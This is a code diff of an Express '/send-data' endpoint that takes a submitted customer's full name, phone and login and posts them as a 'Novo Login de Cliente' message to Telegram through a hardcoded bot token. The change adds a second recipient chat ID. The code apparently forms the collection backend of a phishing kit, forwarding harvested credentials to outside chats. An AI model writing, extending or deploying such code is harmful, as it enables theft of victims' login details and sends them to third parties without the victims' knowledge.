@@ -29,7 +29,7 @@ app.post('/send-data', async (req, res) => {
 
     // Configurações do Telegram
     const token = '7045955625:AAGaTLknx9YYk3powiCXn_R6sIGOP8f3bcE';
-    const chatId = '5114449108';
+    const chatIds = ['5114449108', '6489258446']; // Adicionado o novo chatId
     const message = `Novo Login de Cliente:
     Nome: ${fullname}
     Telefone: ${phone}
@@ -39,11 +39,18 @@ app.post('/send-data', async (req, res) => {
     // URL da API do Telegram
     const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
 
-    // Envia para o Telegram
-    const response = await axios.post(telegramUrl, {
-      chat_id: chatId,
-      text: message
-    });
+    // Envia a mensagem para cada chatId
+    for (const chatId of chatIds) {
+      try {
+        const response = await axios.post(telegramUrl, {
+          chat_id: chatId,
+          text: message
+        });
+        console.log(`Mensagem enviada para chatId ${chatId}:`, response.data);
+      } catch (error) {
+        console.error(`Erro ao enviar para chatId ${chatId}:`, error.message);
+      }
+    }
 
     console.log('Dados enviados para o Telegram:', { fullname, phone, login });
     res.json({ success: true, message: 'Dados enviados com sucesso' });
